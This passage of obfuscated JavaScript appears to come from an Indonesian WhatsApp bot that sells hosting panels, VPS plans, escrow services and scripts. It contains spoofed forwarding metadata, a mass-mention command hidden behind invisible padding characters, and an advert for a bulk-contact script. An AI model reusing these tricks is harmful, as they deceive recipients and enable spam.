              categories: _0x52dc00.tags
            });
            await fs3.unlinkSync(_0x20a7ae);
          }
        }
        break;
      case "owner":
        {
          const _0x1ec13f = {
            forwardingScore: 9999999,
            isForwarded: true,
            mentionedJid: [_0x228fe0]
          };
          const _0x37259a = {
            quoted: _0x4611fa
          };
          const _0x8a86d0 = await _0x221ba4.sendMessage(_0x1dd769, {
            contacts: {
              displayName: _0x455732.length + " Kontak",
              contacts: _0x455732
            },
            contextInfo: _0x1ec13f
          }, _0x37259a);
          const _0x4bf98f = {
            quoted: _0x8a86d0
          };
          _0x221ba4.sendMessage(_0x1dd769, {
            text: "Hai Kak @" + _0x228fe0.split("@")[0] + ", Ini Owner Ku Kak Kalo Mau Buy Panel Ke Dia Aja",
            contextInfo: {
              forwardingScore: 9999999,
              isForwarded: true,
              mentionedJid: [_0x228fe0]
            }
          }, _0x4bf98f);
        }
        break;
      case "tagall":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply(mess.only.owner);
          }
          if (!_0x3c8260) {
            return _0x1d3510(mess.only.badmin);
          }
          if (!_0x2ec274) {
            return _0x1d3510(mess.only.group);
          }
          if (!q) {
            return _0x1d3510("Teks nya mana mek ?");
          }
          let _0x4db2f = (q ? q : "") + "\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n⌜ TAGG KABEHAN BY KAZEY OFFCIAL ⌟\n";
          for (let _0x4f4589 of _0x264c7c) {
            _0x4db2f += "⊝ @" + _0x4f4589.id.split("@")[0] + "\n";
          }
          const _0x3a7722 = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, {
            text: _0x4db2f,
            mentions: _0x264c7c.map(_0x33f588 => _0x33f588.id)
          }, _0x3a7722);
        }
        break;
      case "public":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          _0x221ba4.public = true;
          _0x1d3510(mess.success);
        }
        break;
      case "self":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          _0x221ba4.public = false;
          _0x1d3510(mess.success);
        }
        break;
      case "formatneed":
        {
          const _0x34b84a = "*FORMAT JASA NEED AKUN BY " + botname + "*\n*( BUKAN AKUN ADMIN )*\n\nNAMA PEMILIK : \nAKUN :\nLOGIN :\nHARGA : \nSPEK AKUN :  \n  \n*#TIDAK MENERIMA KIRKON*\n\n📝𝐍𝐎𝐓𝐄 : \n*WAJIB MENGGUNAKAN JASA ADMIN " + botname + " UNTUK MENGHINDARI PENIPUAN*\n\n*PERINGATAN ⚠️*\n*MOHON NAMA PEMILIK AKUNNYA HARUS DI ISI DENGAN BENAR AGAR SELLER GAMPANG DI CARI*";
          const _0x23fb03 = {
            mentionedJid: [_0x228fe0],
            forwardingScore: 9999,
            isForwarded: true
          };
          const _0xb5f75b = {
            image: {
              url: "https://files.catbox.moe/m6wbpq.jpg"
            },
            caption: _0x34b84a,
            fileLength: 10,
            contextInfo: _0x23fb03
          };
          const _0x1bae66 = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, _0xb5f75b, _0x1bae66);
        }
        break;
      case "formatpost":
        {
          const _0x2b52ed = "🥀FORMAT JASPOST BY " + botname + "🥀\n(BUKAN AKUN MILIK ADMIN)\n                   \nJUAL AKUN :\nSPEK :\nHARGA:\nNOMER : wa.me/\n\n\nNOTE‼️: WAJIB MENGGUNAKAN JASA ADMIN " + botname + " AGAR TERHINDAR DARI PENIPUAN\n\n\n🥀BEE SMART BUYER🥀";
          const _0x24ab54 = {
            mentionedJid: [_0x228fe0],
            forwardingScore: 9999,
            isForwarded: true
          };
          const _0x2b8875 = {
            image: {
              url: "https://files.catbox.moe/m6wbpq.jpg"
            },
            caption: _0x2b52ed,
            fileLength: 10,
            contextInfo: _0x24ab54
          };
          const _0x41b256 = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, _0x2b8875, _0x41b256);
        }
        break;
      case "feerekber":
        {
          const _0x25bf4c = "FEE BER² " + botname + "\n•0 - 20K ≠ 5K\n•21K - 150K ≠ 10K\n•151K - 200K ≠ 15K\n•201K - 324K ≠ 20K\n•325K - 400K ≠ 25K\n•401K - 500K ≠ 30K\n•501K - 599K ≠ 35K\n•600K - 699K ≠ 40K\n•700K - 799K ≠ 45K\n•800K - 1JT ≠ 50K\n•1,1JT - 1,7JT ≠ 70K\n•1,8JT - 2,5JT ≠ 100K\n•BTBER ≠ 50K \n•TTBEB ≠ 50K";
          const _0x2df339 = {
            mentionedJid: [_0x228fe0],
            forwardingScore: 9999,
            isForwarded: true
          };
          const _0x536839 = {
            image: {
              url: "https://files.catbox.moe/m6wbpq.jpg"
            },
            caption: _0x25bf4c,
            fileLength: 10,
            contextInfo: _0x2df339
          };
          const _0x33d1c0 = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, _0x536839, _0x33d1c0);
        }
        break;
      case "listpanel":
        {
          const _0x37de6f = "SEWA PANEL Dáreen Albérich𓆰⸸𓆪\n\n➠ PANEL PROMO FRESH PROMO\n\n╭━「 PAKET SILVER 」\n│⛁ RAM 1GB | CPU 30%\n╰━━━☉ HARGA : 3k\n\n╭━「 PAKET SILVER 」\n│⛁ RAM 2GB | CPU 50%\n╰━━━☉ HARGA : 5k\n\n╭━「 PAKET GOLD 」\n│⛁ RAM 3GB | CPU 70%\n╰━━━☉ HARGA : 7K\n\n╭━「 PLATINUM (HOT) 」\n│⛁ RAM 4GB | CPU 90%\n╰━━━☉ HARGA : 9K\n\n╭━「 EXECUTIVE 」\n│⛁ RAM 5GB | CPU 100%\n╰━━━☉ HARGA : 10K\n\n╭━「 ULTIMATE (HOT) 」\n│⛁ RAM 7GB | CPU 130%\n╰━━━☉ HARGA : 12K\n\n╭━「 SUPER ULTIMATE 」\n│⛁ RAM UNLI | CPU UNLI%\n╰━━━☉ HARGA : 15K\n\n*Reqwest ram dan cpu chat langsung\n\nKeuntungan sewa panel di kami?\n➠ Server terjaga \n➠ Jual kualitas bukan asal jual\n➠ Hemat kuota \n➠ Hemat penyimpanan\n➠ Web close? bot tetep on!\n\n*Harga diatas adalah untuk 1bulan\n\nMINAT CHAT : \nhttps://wa.me/6283169231840";
          const _0x3ecffd = {
            mentionedJid: [_0x228fe0],
            forwardingScore: 9999,
            isForwarded: true
          };
          const _0x1647f4 = {
            image: {
              url: "https://files.catbox.moe/m6wbpq.jpg"
            },
            caption: _0x37de6f,
            fileLength: 10,
            contextInfo: _0x3ecffd
          };
          const _0x28905b = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, _0x1647f4, _0x28905b);
        }
        break;
      case "listvps":
        {
          const _0x5dcaa = "OPEN VPS NYA JUGA BUAT SERVER SENDIRI\nREADY PROMO VPS NYA KAK ‼️\n\nLIST :\n📮 VPS RAM 16GB 8 CORE : 100K\n📮 VPS RAM 8GB 4 CORE : 55K\n📮 VPS RAM 4GB 2 CORE : 45K\n📮 VPS RAM 2GB 1 CORE : 35K\n📮 VPS RAM 1GB 1 CORE : 25K\n\nKEUNTUNGAN :\nBUY VPS RAM 4 & 8 FREE SC TEMA\nFREE INSTAL PANEL\nNEGO KE PM AJA ASAL MENGOTAK\n FREE SC CRETAE PANEL BUY VPS RAM 4 & 8";
          const _0x3c40cc = {
            mentionedJid: [_0x228fe0],
            forwardingScore: 9999,
            isForwarded: true
          };
          const _0xf6b6ab = {
            image: {
              url: "https://files.catbox.moe/m6wbpq.jpg"
            },
            caption: _0x5dcaa,
            fileLength: 10,
            contextInfo: _0x3c40cc
          };
          const _0x133800 = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, _0xf6b6ab, _0x133800);
        }
        break;
      case "produklain":
        {
          const _0x3a37df = "💎MENYEDIAKAN\n\n• OPEN OWNER = 35k\n• JASA EDIT SCRIPT PANEL = TERGANTUNG\n• JASA TAMBAH FITUR SCRIPT = TERGANTUNG\n• JASA FIX SCRIPT EROR = TERGANTUNG\n• JASA BUAT SC PRIBADI = TERGANTUNG\n• JASA INSTALL PANEL PTERIDACTYL = 10K\n• JASA INSTALL THEME = 10K BISA NEGO\n• READY Panel RUN BOT ON 24 JAM = KEITK .listpanel\n• READY VPS = KETIK .listvps\n• READY ADMIN PANEL = 15K\n• READY RESELLER PANEL = 10K\n• READY SC NO ENC 100% = TANYA AJA \n• READY SC CPANEL BY Dáreen Albérich𓆰⸸𓆪 = 15-20K\n• READY SC PUSHKONTAK X STORE BY Dáreen Albérich𓆰⸸𓆪 = 10K\n• DLL TANYA AJA KALO ADA YANG DI BUTUHIN";
          const _0x53bc30 = {
            mentionedJid: [_0x228fe0],
            forwardingScore: 9999,
            isForwarded: true
          };
          const _0x1ceb3d = {
            image: {
              url: "https://telegra.ph/file/44a68808942d029924e24.jpg"
            },
            caption: _0x3a37df,
            fileLength: 10,
            contextInfo: _0x53bc30
          };
          const _0x4ac64c = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, _0x1ceb3d, _0x4ac64c);
        }
        break;
      case "setproses":
      case "setp":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3e94bb) {
            return _0x4611fa.reply("Gunakan dengan cara " + (_0x137417 + _0x53d4d1) + " *teks*\n\n_Contoh_\n\n" + (_0x137417 + _0x53d4d1) + " Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) ");
          }
          if (isSetProses(_0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x583dfd)) {
            return _0x4611fa.reply("Set proses already active");
          }
          addSetProses(_0x3e94bb, _0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x583dfd);
          _0x1d3510("✅ Done set proses!");
        }
        break;
      case "changeproses":
      case "changep":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3e94bb) {
            return _0x4611fa.reply("Gunakan dengan cara " + (_0x137417 + _0x53d4d1) + " *teks*\n\n_Contoh_\n\n" + (_0x137417 + _0x53d4d1) + " Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) ");
          }
          if (isSetProses(_0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x583dfd)) {
            changeSetProses(_0x3e94bb, _0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x583dfd);
            _0x4611fa.reply("Sukses ubah set proses!");
          } else {
            addSetProses(_0x3e94bb, _0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x583dfd);
            _0x4611fa.reply("Sukses ubah set proses!");
          }
        }
        break;
      case "delsetproses":
      case "delsetp":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!isSetProses(_0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x583dfd)) {
            return _0x4611fa.reply("Belum ada set proses di gc ini");
          }
          removeSetProses(_0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x583dfd);
          _0x1d3510("Sukses delete set proses");
        }
        break;
      case "setdone":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3e94bb) {
            return _0x4611fa.reply("Gunakan dengan cara " + (_0x137417 + _0x53d4d1) + " *teks*\n\n_Contoh_\n\n" + (_0x137417 + _0x53d4d1) + " Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) ");
          }
          if (isSetDone(_0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x1ae4d0)) {
            return _0x4611fa.reply("Udh set done sebelumnya");
          }
          addSetDone(_0x3e94bb, _0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x1ae4d0);
          _0x1d3510("Sukses set done!");
          break;
        }
      case "changedone":
      case "changed":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3e94bb) {
            return _0x4611fa.reply("Gunakan dengan cara " + (_0x137417 + _0x53d4d1) + " *teks*\n\n_Contoh_\n\n" + (_0x137417 + _0x53d4d1) + " Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) ");
          }
          if (isSetDone(_0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x1ae4d0)) {
            changeSetDone(_0x3e94bb, _0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x1ae4d0);
            _0x4611fa.reply("Sukses ubah set done!");
          } else {
            addSetDone(_0x3e94bb, _0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x1ae4d0);
            _0x4611fa.reply("Sukses ubah set done!");
          }
        }
        break;
      case "delsetdone":
      case "delsetd":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!isSetDone(_0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x1ae4d0)) {
            return _0x4611fa.reply("Belum ada set done di gc ini");
          }
          removeSetDone(_0x4611fa.isGroup ? _0x4611fa.chat : _0x27d4a1, _0x1ae4d0);
          _0x4611fa.reply("Sukses delete set done");
        }
        break;
      case "p":
      case "proses":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x4611fa.quoted) {
            return _0x4611fa.reply("Reply pesanan yang akan proses");
          }
          let _0x528d2a = _0x4611fa.quoted ? _0x3af358.text : _0x3af358.text.split(_0x18d0e5[0])[1];
